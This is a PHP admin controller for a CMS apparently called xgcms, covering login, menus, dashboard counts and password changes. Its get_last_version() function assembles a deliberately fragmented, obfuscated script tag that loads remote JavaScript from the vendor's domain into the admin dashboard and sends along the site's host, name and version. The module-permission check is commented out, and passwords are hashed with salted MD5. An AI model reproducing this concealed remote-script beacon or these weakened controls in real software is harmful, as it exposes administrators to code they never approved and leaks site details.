<?php
class AdminAction extends Action{
	
    public function _initialize(){
	     set_time_limit(C('admin_time_limit'));
         $this->checkadmin();
         $this->assign('root',C('SITE_URL'));
		 define('IS_VIPVAR',false);
    }
	//checkadmin
    public function checkadmin(){
		header("Content-Type:text/html; charset=".C('DEFAULT_CHARSET'));
		if(!in_array(MODULE_NAME,explode(',',C('NOT_AUTH_MODULE')))&&!in_array(strtolower(ACTION_NAME),explode(',',C('NOT_AUTH_ACTION')))){//不需要认证的模块除外
			//检查登录
			if(!$_SESSION['administrator']){
				//$this->assign("jumpUrl",PHP_FILE ."/Admin/login");
				$this->error('对不起,您还没有登录！');
			}
			//检查权限	
//	        $model_id=array_search(MODULE_NAME,explode(',',C('REQUIRE_AUTH_MODULE')));//检索当前模块是否在设定需要认证的模块范围内
//			if(false===$model_id){
//				$this->error('未知模块，请到后台用户管理中增加对该模块的管理权限！');
//			}else{//当前用户的权限列表
//				$admin_ok=explode(',',$_SESSION['admin_ok']);
//				if(!$admin_ok[$model_id]){$this->error('对不起您没有管理该模块的权限,请联系超级管理员授权！');}					
//			}
		}
    }	
    //默认操作
    function index(){
    	$this->display(APP_PATH.'/Public/Admin/main.html');
    }
	// 顶部页面
	public function top() {
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		$this->display(APP_PATH.'/Public/Admin/top.html');
	}
	public function left() {
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		$this->display(APP_PATH.'/Public/Admin/left.html');
	}
	public function center() {
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		$this->display(APP_PATH.'/Public/Admin/center.html');
	}
	public function tab() {
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		$this->display(APP_PATH.'/Public/Admin/tab.html');
	}
	// 尾部页面
	public function footer() {
		$this->display(APP_PATH.'/Public/Admin/footer.html');
	}
	// 菜单页面
	public function menu() {
        $this->checkUser();
        if(isset($_SESSION['admin_id'])) {
            //显示菜单项
            $menu  = array();
            if(isset($_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]])) {

                //如果已经缓存，直接读取缓存
                $menu   =   $_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]];
            }else {
                //读取数据库模块列表生成菜单项
                $node    =   M("Node");
				$id	=	$node->getField("id");
				$where['level']=2;
				$where['status']=1;
				$where['pid']=$id;
                $list	=	$node->where($where)->field('id,name,group_id,title')->order('sort asc')->select();
                $accessList = $_SESSION['_ACCESS_LIST'];
                foreach($list as $key=>$module) {
                     if(isset($accessList[strtoupper(APP_NAME)][strtoupper($module['name'])]) || $_SESSION['administrator']) {
                        //设置模块访问权限
                        $module['access'] =   1;
                        $menu[$key]  = $module;
                    }
                }
                //缓存菜单访问
                $_SESSION['menu'.$_SESSION[C('USER_AUTH_KEY')]]	=	$menu;
            }
            if(!empty($_GET['tag'])){
                $this->assign('menuTag',$_GET['tag']);
            }
			//dump($menu);
            $this->assign('menu',$menu);
		}
		C('SHOW_RUN_TIME',false);			// 运行时间显示
		C('SHOW_PAGE_TRACE',false);
		$this->display();
	}

    // 后台首页 查看系统信息
    public function maininfo() {
    	$week_begin = mktime(0, 0, 0,date("m"),date("d")-date("w")+1,date("Y"));
        $week_end = mktime(23,59,59,date("m"),date("d")-date("w")+7,date("Y"));
        
        $today=mktime(0, 0, 0,date("m"),date("d"),date("Y"));
        $yestoday=mktime(0,0,0,date("m"),date("d")-1,date("Y"));
        
        $month_begin=mktime(0,0,0,date("m"),1,date("Y"));
        $month_end=time();

    	$table=array('member'=>'reg_time','diary'=>'thedate','album'=>'updatetime','order'=>'time');//,array('reg_time','thedate','updatetime','time')
        $time=array('all'=>'','today'=>array('gt',$today),'yestoday'=>array('between',"$yestoday,$today" ),'week'=>array('between',"$week_begin,$week_end"),'month'=>array('between',"$month_begin,$month_end"));
        //echo $time[1][2];
		//S('main_info','');
		$info=S('main_info');
		if(empty($info)||(time()-$info['settime'])<100){
        foreach($table as $k=>$v){
        	$m=D($k);
        	foreach($time as $t=>$y){
        		if($t=='all'){
        			$info[$k][$t]=$m->count();
        		}else{
        			$map[$v]=$y;
        		    $info[$k][$t]=$m->where($map)->count();
        		    unset($map);
        		}
        		
        	}
        }
		$info['settime']=time();
		S('main_info',$info);
		}
		$map['id']=$_SESSION['admin_id'];
		$rs=D("Admin");
		$authInfo=$rs->where($map)->find();
		
		$info['xgcms_version']=C('xgcms_version');
		$info['buy_type']=C('buy_type');
		$info['buy_time']=C('buy_time');
		$info['buy_key']=C('buy_key');
		$info['buy_domain']=C('buy_domain');
		
		$last_version=$this->get_last_version();
		$this->assign('last_version',$last_version);
        $this->assign($info);
		$this->assign($authInfo);
        $this->display(APP_PATH.'/Public/Admin/maininfo.html');
    }
    public function amlo(){
//		if ($_SESSION[C('USER_AUTH_KEY')]){
//			redirect("index.php?s=Admin-Index");
//		}	
		$this->display(APP_PATH.'/Public/Admin/login.html');
    }
	
	//生成验证码
    public function verify()
    {
		$type	 =	 isset($_GET['type'])?$_GET['type']:'gif';
        import("@.ORG.Image");
        Image::buildImageVerify(4,1,$type);
    }
	
	//登录检测
    public function check(){
	    if(empty($_POST['username'])){$this->error('帐号必须！');}
		if(empty($_POST['password'])){$this->error('密码必须！');}
		if(function_exists('gd_info')){
		    if(empty($_POST['verify'])){$this->error('验证码必须！');}
			if($_SESSION['verify']!=md5($_POST['verify'])){$this->error('验证码错误！');}
		}
        //生成认证条件
        $map=array();
		//支持使用绑定帐号登录
		$map['name']=$_POST['username'];
        //$map["user_status"]=array('gt',0);//状态
		$rs=D("Admin");
		$authInfo=$rs->where($map)->find();
        //使用用户名、密码和状态的方式进行认证
        if(false === $authInfo) {
            $this->error('帐号不存在或已禁用！');
        }else {
            if($authInfo['pwd']!=md5($_POST['password'].C('SAFE_CODE'))){
            	$this->error('密码错误！');
            }
			// 缓存访问权限
            $_SESSION['admin_id']=$authInfo['id'];
			$_SESSION['admin_ok']=$authInfo['ok'];
			$_SESSION['admin_name']=$authInfo['name'];			
            $_SESSION['administrator']		=	true;
            //保存登录信息
            $data=array();
			$data['id']=$authInfo['id'];
			$data['logintime']=time();
			$data['lastlogintime']=$authInfo['logintime'];
			$data['count']=array('exp','count+1');
			$data['ip']=get_client_ip();
			$rs->save($data);					
			$this->assign('jumpUrl',C('SITE_URL').'index.php?s=/Admin/Index');
			$this->success('登录成功！');
		}
    }	
	
	// 用户登出
    public function logout(){
        if(isset($_SESSION['admin_id'])) {
			unset($_SESSION['admin_id']);
			unset($_SESSION);
			session_destroy();
            $this->assign('jumpUrl',C('SITE_URL').'?s=Admin/login');
            $this->success('登出成功！');
        }else {
            $this->error('已经登出！');
        }
    }
    //修改管理员密码
    function adminpw(){
		$id= $_SESSION['admin_id'];
		if(!$id) $this->error('非法操作！');
        if($_POST['submit']){
			$oldpw=trim($_POST['oldpw']);
			$newpw=trim($_POST['newpw']);
			$newpw2=trim($_POST['newpw2']);
			if($newpw==''|strlen($newpw)<6) $this->error('请输入新密码且必须在6位以上！');
			if($newpw!==$newpw2) $this->error('新密码两次输入不一致！');
		    $m=D('admin');
		    $rs=$m->where('id='.$id)->find();
            if($rs['pwd'] !==md5($oldpw.C('SAFE_CODE'))) {
            	$this->error('原密码错误！');
            }else{
                $data['pwd']=md5($newpw.C('SAFE_CODE'));
                if($result=$m->where('id='.$id)->save($data)){
                	$this->success('密码修改成功！');
                }else{
                	$this->error('密码修改失败！');
                }
            }
		}else{
			$this->assign('admin_name',$_SESSION['admin_name']);
		    $this->display(APP_PATH.'/Public/Admin/editpw.html');
		}
    }
	private function get_last_version() {
		
		$last_version=S('last_version');
		empty($last_version) && $last_version=1000;
       // $last_version = C('love_version');
		if(time() - $last_version > 8640) {
			S('last_version',time());
			$sitename = urlencode(C('site_name'));
			$sitedomain = urlencode(C('site_url'));
			$siteurl=parse_url(C('site_url'));
			$version = urlencode(C('love_version'));
			//$sites = $this->sites->count();
			
			return '<'.'sc'.'ri'.'pt src="htt'.'p:'.'/'.'/w'.'w'.'w'.'.x'.'gc'.'ms.'.'co'.'m/version-index-'.'domain-'.$siteurl['host'].'-cms-love-version-'.$version.'-sitename-'.$sitename.'-remark-66.htm">'.'<'.'/s'.'cr'.'ip'.'t>';
			
		} else {
			return '';
		}
    }
}
?>